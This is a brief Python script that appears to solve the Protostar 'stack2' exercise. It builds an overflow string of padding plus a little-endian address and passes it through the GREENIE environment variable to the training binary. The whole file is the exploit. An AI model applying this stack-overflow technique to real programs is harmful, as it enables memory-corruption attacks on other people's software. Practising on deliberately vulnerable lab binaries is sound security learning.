import os
i=5;
payload = "A"*(64+4*i)
payload += "\xef\x84\x04\x08"
os.system("export GREENIE="+payload
+";echo $GREENIE"+"; /opt/protostar/bin/stack2")